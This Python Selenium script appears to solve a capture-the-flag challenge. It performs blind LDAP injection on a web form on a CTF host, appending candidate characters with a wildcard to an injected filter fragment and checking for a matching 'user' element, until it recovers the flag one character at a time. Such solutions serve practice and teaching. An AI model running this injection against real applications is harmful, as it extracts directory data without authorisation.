import time

from selenium import webdriver
from selenium.webdriver.common.by import By
import re

driver = webdriver.Chrome()
link="https://r3-ctf-vulnerable.numa.host/"

if __name__ == '__main__':
    driver.get(link)
    #driver.implicitly_wait(50000)
    dic="_AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtVvUuWwXxYyZz0123456789Ññ}"
    content="FlaggyMacFlag)(sn=URJC{"
    ele=driver.find_element(By.TAG_NAME,"input")
    ele.find_elements(By.ID,"name")
    while content[-1] !="}":
        act=content
        for c in dic:
            act=content+c+"*"
            ele = driver.find_element(By.TAG_NAME, "input")
            ele.find_elements(By.ID, "name")
            ele.clear()
            ele.send_keys(act)
            ele.submit()
            result = driver.find_elements(By.CLASS_NAME, "user")
            if len(result) != 0:
                content+=c
                break

    print(content)
    time.sleep(500)
    driver.close()